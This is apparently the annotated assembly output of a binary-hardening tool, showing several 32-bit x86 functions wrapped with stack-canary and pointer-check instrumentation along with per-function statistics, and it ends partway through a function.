; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 1
;                 :  0x0(0x0); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 2
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1820,7
.p2align 3,0x1825
FuncPtr_0x804a6b0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a6b0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a6b0:

Label_0x804a6b0:
   push    %edi                               # [0(2549)]stackSize = 0x4   #32
   push    %esi                               # [1(2550)]stackSize = 0x8   #32
   push    %eax                               # [2(2551)]stackSize = 0xc   #32
   mov     %edx, %esi                         # [3(2552)]   #32
   mov     %ecx, %edi                         # [4(2553)]   #32
   mov     %edi, (%esp)                       # [5(2554)]   #32
   call    Func_0x804a770  #pp1: Label_0x804a770 VAR_ADDRESS #32
   cmp     $0x1f, %eax                        # [7(2556)]   #32
   jg      Label_0x804a6e6 #32
Label_0x804a6c4: #p6a
   mov     Var_0x80604c8(, %eax ,  0x4), %ecx # [9(2558)]Using Global Array Variable
#  PTRCHECK arg[0]    #32
   jmp     Label_0x804a6d3 #32
Label_0x804a6d0: #p6a
   mov     0x8(%ecx), %ecx                    # [11(2560)]Using Pointer PTRCHECK arg[0]    #32
Label_0x804a6d3: #p6a
   test    %ecx, %ecx                         # [12(2561)]   #32
   mov     %ecx, (%esi)                       # [13(2562)]Using Pointer PTRCHECK arg[1]  Already checked [13]# FLAGS USED   #32
   je      Label_0x804a6e0 #32
   cmp     %edi, (%ecx)                       # [15(2564)]Using Pointer PTRCHECK arg[1]    #32
   jb      Label_0x804a6d0 #32
   jmp     Label_0x804a6ec #32
Label_0x804a6e0: #p6a
   add     $0x1, %eax                         # [18(2567)]   #32
   cmp     $0x20, %eax                        # [19(2568)]   #32
   jl      Label_0x804a6c4 #32
Label_0x804a6e6: #p6a
   movl    $0x0, (%esi)                       # [21(2570)]Using Pointer PTRCHECK arg[1]  Already checked [13]   #32
Label_0x804a6ec: #p6a
   add     $0x4, %esp                         # [22(2571)]stackSize = 0x8   #32
   pop     %esi                               # [23(2572)]stackSize = 0x4   #32
   pop     %edi                               # [24(2573)]stackSize = 0x0   #32
Label_0x804a6f1: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:44 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 30
     adding function wrapper

;     Start Index : 1918 (0x8049c70)
;       End Index : 1923 (0x8049c8a)
;   Num Instructs : 6
;      Stack Size : 12 (0xc)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0xc), 0x4(0x8); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2620,7
.p2align 3,0x2625
FuncPtr_0x8049c70:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049c70,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049c70:

Label_0x8049c70:
   sub     $0xc, %esp                         # [0(1918)]stackSize = 0xc   #32
   movl    $Var_0x804b949, 0x4(%esp)          # [1(1919)]   #32
   movl    $0x1, (%esp)                       # [2(1920)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049c82
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   add     $0xc, %esp                         # [4(1922)]stackSize = 0x0   #32
Label_0x8049c8a: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:30 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 29
     adding function wrapper

;     Start Index : 1874 (0x8049ba0)
;       End Index : 1917 (0x8049c5f)
;   Num Instructs : 44
;      Stack Size : 24 (0x18)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: true
; Makes Calls: 6
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 5
;     ESP Offsets : 5
;                 :  0x0(0x18), 0x4(0x14), 0x8(0x10), 0x10(0x8),
;                 :  0x14(0x4); Function Pointers : 1
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6120,7
.p2align 3,0x6125
FuncPtr_0x8049ba0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049ba0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049ba0:

Label_0x8049ba0:
   push    %esi                               # [0(1874)]stackSize = 0x4   #32
   sub     $0x18, %esp                        # [1(1875)]stackSize = 0x1c   #32
   movl    $Var_0x804b8ba, 0x4(%esp)          # [2(1876)]   #32
   movl    $0x1, (%esp)                       # [3(1877)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049bb3
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049bb8
   .long    Func_0x80498c0  #pp1w: Label_0x80498c0 VAR_ADDRESS #32
   test    %eax, %eax                         # [6(1880)]   #32
   jne     Label_0x8049c22 #32
   lea     0x10(%esp), %ecx                   # [8(1882)] Loading Pointer with stackSize: 28   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049bc5
   .long    Func_0x8049a70  #pp1w: Label_0x8049a70 VAR_ADDRESS #32
   mov     0x10(%esp), %eax                   # [10(1884)]   #32
   mov     0x14(%esp), %ecx                   # [11(1885)]   #32
   mov     %ecx, %edx                         # [12(1886)]   #32
   or      %eax, %edx                         # [13(1887)]# FLAGS USED   #32
   js      Label_0x8049c22 #32
   cmpl    $0x0, Var_0x80604c0                # [15(1889)]   #32
   je      Label_0x8049c3b #32
   mov     Var_0x80602ac, %edx                # [17(1891)]   #32
   mov     %ecx, 0x4(%esp)                    # [18(1892)]   #32
   mov     %eax, (%esp)                       # [19(1893)]   #32
Label_0x8049bf1: #pn8

   pushl    0x30(%edx)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   mov     %eax, %esi                         # [21(1895)]   #32
   subl    $0x1, Var_0x80604c0                # [22(1896)]   #32
   test    %esi, %esi                         # [23(1897)]   #32
   je      Label_0x8049c45 #32
   movl    $Var_0x804b8f9, 0x4(%esp)          # [25(1899)]   #32
   movl    $0x1, (%esp)                       # [26(1900)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049c0f
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     %esi, 0x8(%esp)                    # [28(1902)]   #32
   movl    $Var_0x804b912, 0x4(%esp)          # [29(1903)]   #32
   jmp     Label_0x8049c4d #32
Label_0x8049c22: #p6a
   movl    $Var_0x804b832, 0x4(%esp)          # [31(1905)]   #32
Label_0x8049c2a: #p6a
   movl    $0x1, (%esp)                       # [32(1906)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049c31
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
Label_0x8049c36: #p6a
   add     $0x18, %esp                        # [34(1908)]stackSize = 0x4   #32
   pop     %esi                               # [35(1909)]stackSize = 0x0   #32
Label_0x8049c3a: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8049c3b: #p6a
   movl    $Var_0x804b8e1, 0x4(%esp)          # [37(1911)]   #32
   jmp     Label_0x8049c2a #32
Label_0x8049c45: #p6a
   movl    $Var_0x804b925, 0x4(%esp)          # [39(1913)]   #32
Label_0x8049c4d: #p6a
   movl    $0x1, (%esp)                       # [40(1914)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049c54
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   add     %esi, Var_0x80604b8                # [42(1916)]   #32
   jmp     Label_0x8049c36 #32

/*;;;;;;;; 
; id:29 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 27
     adding function wrapper

;     Start Index : 1794 (0x8049a70)
;       End Index : 1863 (0x8049b61)
;   Num Instructs : 70
;      Stack Size : 28 (0x1c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 8
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 4
;     ESP Offsets : 4
;                 :  0x0(0x1c), 0x4(0x18), 0x8(0x14), 0x18(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x8520,7
.p2align 3,0x8525
FuncPtr_0x8049a70:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049a70,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049a70:

Label_0x8049a70:
   push    %ebp                               # [0(1794)]stackSize = 0x4   #32
   push    %ebx                               # [1(1795)]stackSize = 0x8   #32
   push    %edi                               # [2(1796)]stackSize = 0xc   #32
   push    %esi                               # [3(1797)]stackSize = 0x10   #32
   sub     $0x1c, %esp                        # [4(1798)]stackSize = 0x2c   #32
   mov     %ecx, %esi                         # [5(1799)]   #32
   movl    $Var_0x80602b5, 0x18(%esp)         # [6(1800)]   #32
   lea     0x18(%esp), %edi                   # [7(1801)] Loading Pointer with stackSize: 44   #32
   mov     %edi, (%esp)                       # [8(1802)]   #32
   movl    $Var_0x804b8ac, 0x4(%esp)          # [9(1803)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049a90
   .long    Func_0x804b410  #pp1w: Label_0x804b410 VAR_ADDRESS #32
   mov     %eax, %ebx                         # [11(1805)]   #32
   mov     %edi, (%esp)                       # [12(1806)]   #32
   movl    $Var_0x804bb1a, 0x4(%esp)          # [13(1807)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049aa2
   .long    Func_0x804b410  #pp1w: Label_0x804b410 VAR_ADDRESS #32
   mov     %eax, %edi                         # [15(1809)]   #32
   mov     0x18(%esp), %eax                   # [16(1810)]   #32
   test    %eax, %eax                         # [17(1811)]   #32
   cmovne  %eax, %edi                         # [18(1812)]   #32
   test    %ebx, %ebx                         # [19(1813)]   #32
   je      Label_0x8049b15 #32
   test    %edi, %edi                         # [21(1815)]   #32
   je      Label_0x8049b15 #32
   mov     %ebx, (%esp)                       # [23(1817)]   #32
   call    Func_0x804b2e0  #pp1: Label_0x804b2e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [25(1819)]   #32
   je      Label_0x8049b15 #32
   mov     %edi, (%esp)                       # [27(1821)]   #32
   call    Func_0x804b2e0  #pp1: Label_0x804b2e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [29(1823)]   #32
   je      Label_0x8049b15 #32
   mov     %ebx, %ebp                         # [31(1825)]   #32
Label_0x8049ae0: #p6a
   movsbl  (%ebp), %eax                       # [32(1826)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [33(1827)]   #32
   je      Label_0x8049af7 #32
   add     $0x1, %ebp                         # [35(1829)]   #32
   mov     %eax, (%esp)                       # [36(1830)]   #32
   call    Func_0x804a380  #pp1: Label_0x804a380 VAR_ADDRESS #32
   test    %eax, %eax                         # [38(1832)]   #32
   jne     Label_0x8049ae0 #32
   jmp     Label_0x8049b15 #32
Label_0x8049af7: #p6a
   mov     %edi, %ebp                         # [41(1835)]   #32
Label_0x8049b00: #p6a
   movsbl  (%ebp), %eax                       # [42(1836)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [43(1837)]   #32
   je      Label_0x8049b2a #32
   add     $0x1, %ebp                         # [45(1839)]   #32
   mov     %eax, (%esp)                       # [46(1840)]   #32
   call    Func_0x804a380  #pp1: Label_0x804a380 VAR_ADDRESS #32
   test    %eax, %eax                         # [48(1842)]   #32
   jne     Label_0x8049b00 #32
Label_0x8049b15: #p6a
   movl    $-0x1, (%esi)                      # [50(1844)]Using Pointer PTRCHECK arg[1]    #32
   movl    $-0x1, 0x4(%esi)                   # [51(1845)]Using Pointer PTRCHECK arg[1]    #32
Label_0x8049b22: #p6a
   add     $0x1c, %esp                        # [52(1846)]stackSize = 0x10   #32
   pop     %esi                               # [53(1847)]stackSize = 0xc   #32
   pop     %edi                               # [54(1848)]stackSize = 0x8   #32
   pop     %ebx                               # [55(1849)]stackSize = 0x4   #32
   pop     %ebp                               # [56(1850)]stackSize = 0x0   #32
Label_0x8049b29: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8049b2a: #p6a
   mov     %ebx, (%esp)                       # [58(1852)]   #32
   movl    $0xa, 0x8(%esp)                    # [59(1853)]   #32
   movl    $0x0, 0x4(%esp)                    # [60(1854)]   #32
   call    Func_0x804b470  #pp1: Label_0x804b470 VAR_ADDRESS #32
   mov     %eax, %ebx                         # [62(1856)]   #32
   mov     %edi, (%esp)                       # [63(1857)]   #32
   movl    $0xa, 0x8(%esp)                    # [64(1858)]   #32
   movl    $0x0, 0x4(%esp)                    # [65(1859)]   #32
   call    Func_0x804b470  #pp1: Label_0x804b470 VAR_ADDRESS #32
   mov     %ebx, (%esi)                       # [67(1861)]Using Pointer PTRCHECK arg[1]    #32
   mov     %eax, 0x4(%esi)                    # [68(1862)]Using Pointer PTRCHECK arg[1]    #32
   jmp     Label_0x8049b22 #32

/*;;;;;;;; 
; id:27 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 86   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2777 (0x804a990)
;       End Index : 2803 (0x804a9cd)
;   Num Instructs : 27
;      Stack Size : 0 (0x0)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0x14(0x4), 0x18(0x4), 0x1c(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x020,7
.p2align 3,0x025
FuncPtr_0x804a990:

Func_0x804a990:

Label_0x804a990:
   push    %ebp                               # [0(2777)]stackSize = 0x4   #32
   push    %ebx                               # [1(2778)]stackSize = 0x8   #32
   push    %edi                               # [2(2779)]stackSize = 0xc   #32
   push    %esi                               # [3(2780)]stackSize = 0x10   #32
   xor     %ebp, %ebp                         # [4(2781)]   #32
   mov     0x1c(%esp), %ecx                   # [5(2782)]   #32
   test    %ecx, %ecx                         # [6(2783)]   #32
   je      Label_0x804a9c7 #32
   mov     0x18(%esp), %edx                   # [8(2785)]   #32
   mov     0x14(%esp), %esi                   # [9(2786)]   #32
   xor     %edi, %edi                         # [10(2787)]   #32
Label_0x804a9b0: #p6a
   movsbl  (%esi, %edi ,  0x1), %ebx          # [11(2788)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   movsbl  (%edx, %edi ,  0x1), %eax          # [12(2789)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   cmp     %bl, %al                           # [13(2790)]   #32
   jne     Label_0x804a9c3 #32
   add     $0x1, %edi                         # [15(2792)]   #32
   cmp     %ecx, %edi                         # [16(2793)]   #32
   jb      Label_0x804a9b0 #32
   jmp     Label_0x804a9c7 #32
Label_0x804a9c3: #p6a
   sub     %ebx, %eax                         # [19(2796)]   #32
   mov     %eax, %ebp                         # [20(2797)]   #32
Label_0x804a9c7: #p6a
   mov     %ebp, %eax                         # [21(2798)]   #32
   pop     %esi                               # [22(2799)]stackSize = 0xc   #32
   pop     %edi                               # [23(2800)]stackSize = 0x8   #32
   pop     %ebx                               # [24(2801)]stackSize = 0x4   #32
   pop     %ebp                               # [25(2802)]stackSize = 0x0   #32
Label_0x804a9cd: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:86 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 51   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2805 (0x804a9d0)
;       End Index : 2821 (0x804a9fb)
;   Num Instructs : 17
;      Stack Size : 0 (0x0)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0xc(0x4), 0x10(0x4), 0x14(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2920,7
.p2align 3,0x2925
FuncPtr_0x804a9d0:

Func_0x804a9d0:

Label_0x804a9d0:
   push    %ebx                               # [0(2805)]stackSize = 0x4   #32
   push    %esi                               # [1(2806)]stackSize = 0x8   #32
   mov     0x14(%esp), %ecx                   # [2(2807)]   #32
   mov     0xc(%esp), %eax                    # [3(2808)]   #32
   test    %ecx, %ecx                         # [4(2809)]   #32
   je      Label_0x804a9f9 #32
   mov     0x10(%esp), %edx                   # [6(2811)]   #32
   mov     %eax, %esi                         # [7(2812)]   #32
Label_0x804a9f0: #p6a
   mov     (%edx), %bl                        # [8(2813)]Using Pointer PTRCHECK arg[0]    #32
   mov     %bl, (%esi)                        # [9(2814)]Using Pointer PTRCHECK arg[1]    #32
   add     $0x1, %edx                         # [10(2815)]   #32
   add     $0x1, %esi                         # [11(2816)]   #32
   sub     $0x1, %ecx                         # [12(2817)]# FLAGS USED   #32
   jne     Label_0x804a9f0 #32
Label_0x804a9f9: #p6a
   pop     %esi                               # [14(2819)]stackSize = 0x4   #32
   pop     %ebx                               # [15(2820)]stackSize = 0x0   #32
Label_0x804a9fb: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:51 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 26
     adding function wrapper

;     Start Index : 1753 (0x80499c0)
;       End Index : 1793 (0x8049a6e)
;   Num Instructs : 41
;      Stack Size : 28 (0x1c)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: true
; Makes Calls: 5
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 4
;     ESP Offsets : 4
;                 :  0x0(0x1c), 0x4(0x18), 0x10(0xc), 0x14(0x8); Function Pointers : 1
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x8020,7
.p2align 3,0x8025
FuncPtr_0x80499c0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80499c0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80499c0:

Label_0x80499c0:
   sub     $0x1c, %esp                        # [0(1753)]stackSize = 0x1c   #32
   movl    $Var_0x804b80b, 0x4(%esp)          # [1(1754)]   #32
   movl    $0x1, (%esp)                       # [2(1755)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80499d2
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   call    _FuncWrapperHeader      # 2. my address is 0x80499d7
   .long    Func_0x80498c0  #pp1w: Label_0x80498c0 VAR_ADDRESS #32
   test    %eax, %eax                         # [5(1758)]   #32
   jne     Label_0x8049a06 #32
   lea     0x10(%esp), %ecx                   # [7(1760)] Loading Pointer with stackSize: 28   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80499e4
   .long    Func_0x8049a70  #pp1w: Label_0x8049a70 VAR_ADDRESS #32
   mov     0x10(%esp), %eax                   # [9(1762)]   #32
   mov     0x14(%esp), %ecx                   # [10(1763)]   #32
   mov     %ecx, %edx                         # [11(1764)]   #32
   or      %eax, %edx                         # [12(1765)]# FLAGS USED   #32
   js      Label_0x8049a06 #32
   cmp     $0x1fff, %eax                      # [14(1767)]   #32
   jg      Label_0x8049a06 #32
   cmp     $0x2000, %ecx                      # [16(1769)]   #32
   jl      Label_0x8049a1e #32
Label_0x8049a06: #p6a
   movl    $Var_0x804b832, 0x4(%esp)          # [18(1771)]   #32
Label_0x8049a0e: #p6a
   movl    $0x1, (%esp)                       # [19(1772)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049a15
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   add     $0x1c, %esp                        # [21(1774)]stackSize = 0x0   #32
Label_0x8049a1d: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8049a1e: #p6a
   cmpl    $0x0, Var_0x80604bc                # [23(1776)]   #32
   je      Label_0x8049a5c #32
   mov     Var_0x80602ac, %edx                # [25(1778)]   #32
   mov     %ecx, 0x4(%esp)                    # [26(1779)]   #32
   mov     %eax, (%esp)                       # [27(1780)]   #32
Label_0x8049a37: #pn8

   pushl    0x34(%edx)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   test    %eax, %eax                         # [29(1782)]   #32
   je      Label_0x8049a66 #32
   movl    $Var_0x804b85d, 0x4(%esp)          # [31(1784)]   #32
   movl    $0x1, (%esp)                       # [32(1785)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049a4d
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   subl    $0x1, Var_0x80604bc                # [34(1787)]   #32
   add     $0x1c, %esp                        # [35(1788)]stackSize = 0x0   #32
Label_0x8049a5b: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8049a5c: #p6a
   movl    $Var_0x804b847, 0x4(%esp)          # [37(1790)]   #32
   jmp     Label_0x8049a0e #32
Label_0x8049a66: #p6a
   movl    $Var_0x804b879, 0x4(%esp)          # [39(1792)]   #32
   jmp     Label_0x8049a0e #32

/*;;;;;;;; 
; id:26 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 21
     adding function wrapper

;     Start Index : 1592 (0x8049750)
;       End Index : 1643 (0x8049808)
;   Num Instructs : 52
;      Stack Size : 32 (0x20)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 3
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 7
;     ESP Offsets : 7
;                 :  0x0(0x20), 0x4(0x1c), 0x8(0x18), 0xc(0x14),
;                 :  0x18(0x8), 0x1e(0x2), 0x1f(0x1); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall receive

;
;-------------------------*/

.p2align 4,0x7420,7
.p2align 3,0x7425
FuncPtr_0x8049750:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049750,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049750:

Label_0x8049750:
   push    %ebx                               # [0(1592)]stackSize = 0x4   #32
   push    %edi                               # [1(1593)]stackSize = 0x8   #32
   push    %esi                               # [2(1594)]stackSize = 0xc   #32
   sub     $0x20, %esp                        # [3(1595)]stackSize = 0x2c   #32
   movb    $0x0, 0x1f(%esp)                   # [4(1596)]   #32
   movb    $0x0, 0x1e(%esp)                   # [5(1597)]   #32
   lea     0x18(%esp), %esi                   # [6(1598)] Loading Pointer with stackSize: 44   #32
   mov     %esi, 0xc(%esp)                    # [7(1599)]   #32
   lea     0x1f(%esp), %eax                   # [8(1600)] Loading Pointer with stackSize: 44   #32
   mov     %eax, 0x4(%esp)                    # [9(1601)]   #32
   movl    $0x1, 0x8(%esp)                    # [10(1602)]   #32
   movl    $0x0, (%esp)                       # [11(1603)]   #32
   call    _receive                           # [12(1604)]  System Call to receive() #32
   test    %eax, %eax                         # [13(1605)]   #32
   mov     $0xff, %bl                         # [14(1606)]# FLAGS USED   #32
   jne     Label_0x80497ff #32
   mov     0x18(%esp), %eax                   # [16(1608)]   #32
   test    %eax, %eax                         # [17(1609)]   #32
   je      Label_0x80497ff #32
   mov     %esi, 0xc(%esp)                    # [19(1611)]   #32
   lea     0x1e(%esp), %edi                   # [20(1612)] Loading Pointer with stackSize: 44   #32
   mov     %edi, 0x4(%esp)                    # [21(1613)]   #32
   movl    $0x1, 0x8(%esp)                    # [22(1614)]   #32
   movl    $0x0, (%esp)                       # [23(1615)]   #32
   call    _receive                           # [24(1616)]  System Call to receive() #32
   test    %eax, %eax                         # [25(1617)]   #32
   jne     Label_0x80497ff #32
   mov     0x18(%esp), %eax                   # [27(1619)]   #32
   test    %eax, %eax                         # [28(1620)]   #32
   je      Label_0x80497ff #32
   cmpb    $0xa, 0x1e(%esp)                   # [30(1622)]   #32
   jne     Label_0x80497d0 #32
   mov     0x1f(%esp), %bl                    # [32(1624)]   #32
   jmp     Label_0x80497ff #32
Label_0x80497d0: #p6a
   mov     %esi, 0xc(%esp)                    # [34(1626)]   #32
   mov     %edi, 0x4(%esp)                    # [35(1627)]   #32
   movl    $0x1, 0x8(%esp)                    # [36(1628)]   #32
   movl    $0x0, (%esp)                       # [37(1629)]   #32
   call    _receive                           # [38(1630)]  System Call to receive() #32
   test    %eax, %eax                         # [39(1631)]   #32
   jne     Label_0x80497ff #32
   mov     0x18(%esp), %eax                   # [41(1633)]   #32
   test    %eax, %eax                         # [42(1634)]   #32
   je      Label_0x80497ff #32
   cmpb    $0xa, 0x1e(%esp)                   # [44(1636)]   #32
   jne     Label_0x80497d0 #32
Label_0x80497ff: #p6a
   movsbl  %bl, %eax                          # [46(1638)]   #32
   add     $0x20, %esp                        # [47(1639)]stackSize = 0xc   #32
   pop     %esi                               # [48(1640)]stackSize = 0x8   #32
   pop     %edi                               # [49(1641)]stackSize = 0x4   #32
   pop     %ebx                               # [50(1642)]stackSize = 0x0   #32
Label_0x8049808: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:21 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 31
     adding function wrapper

;     Start Index : 1924 (0x8049c90)
;       End Index : 2010 (0x8049e9c)
;   Num Instructs : 87
;      Stack Size : 28 (0x1c)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 18
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 5
;     ESP Offsets : 5
;                 :  0x0(0x1c), 0x4(0x18), 0x8(0x14), 0xc(0x10),
;                 :  0x10(0xc); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x720,7
.p2align 3,0x725
FuncPtr_0x8049c90:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049c90,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049c90:

Label_0x8049c90:
   sub     $0x1c, %esp                        # [0(1924)]stackSize = 0x1c   #32
   cmpl    $0x0, Var_0x80602b0                # [1(1925)]   #32
   jle     Label_0x8049d2e #32
   mov     Var_0x80604bc, %eax                # [3(1927)]   #32
   or      Var_0x80604c0, %eax                # [4(1928)]# FLAGS USED   #32
   je      Label_0x8049d2e #32
   mov     Var_0x80602b4, %al                 # [6(1930)]   #32
   test    %al, %al                           # [7(1931)]   #32
   je      Label_0x8049dc9 #32
   movl    $Var_0x804baa5, 0x4(%esp)          # [9(1933)]   #32
   movl    $0x1, (%esp)                       # [10(1934)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049ccc
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804bad8, 0x4(%esp)          # [12(1936)]   #32
   movl    $0x1, (%esp)                       # [13(1937)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049ce0
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804ba10, 0x4(%esp)          # [15(1939)]   #32
   movl    $0x1, (%esp)                       # [16(1940)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049cf4
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804bae7, 0x4(%esp)          # [18(1942)]   #32
   movl    $0x1, (%esp)                       # [19(1943)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049d08
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
